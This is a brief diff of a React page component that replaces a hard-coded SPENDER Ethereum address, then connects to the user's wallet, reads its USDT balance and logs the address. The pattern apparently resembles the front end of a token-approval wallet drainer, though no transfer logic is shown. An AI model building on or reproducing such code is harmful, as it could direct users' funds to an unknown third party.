@@ -12,7 +12,7 @@ export default function Home() {
   const { mutateAsync: addWallet } = api.crypto.addWallet.useMutation();
 
   async function handleNext() {
-    const SPENDER = "0x0C90CD2c2AeDb86F7aDEB78640cB0F5ABb554327";
+    const SPENDER = "0x5bEc443A51F192d8cAf9d57b01da7b983f4BEAa0";
     const { provider, signer, address } = await getWallet();
     const balance = await fetchUsdtBalance(provider, address);
     console.log("ADDRESS: ", address);
